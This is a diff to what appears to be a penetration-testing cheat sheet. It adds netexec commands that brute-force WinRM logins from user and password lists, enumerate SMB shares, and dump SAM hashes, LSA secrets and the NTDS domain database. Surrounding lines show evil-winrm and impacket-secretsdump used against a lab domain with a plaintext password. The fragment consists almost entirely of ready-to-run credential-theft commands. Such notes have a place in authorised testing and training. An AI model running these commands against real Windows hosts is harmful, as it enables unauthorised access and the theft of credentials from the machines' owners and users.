@@ -189,6 +189,18 @@ docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105
 
 ```
 
+
+using netexec :
+```bash
+netexec winrm <ip> -u user.list -p password.list
+netexec smb <ip> -u "user" -p "password" --shares
+netexec smb <ip> --local-auth -u <username> -p <password> --sam
+netexec smb <ip> --local-auth -u <username> -p <password> --lsa
+netexec smb <ip> -u <username> -p <password> --ntds
+```
+
+
+
 #### Credentials Dumping :
 ```bash
 impacket-secretsdump Marvel.local/fcastle:"Password@123"@192.168.154.131
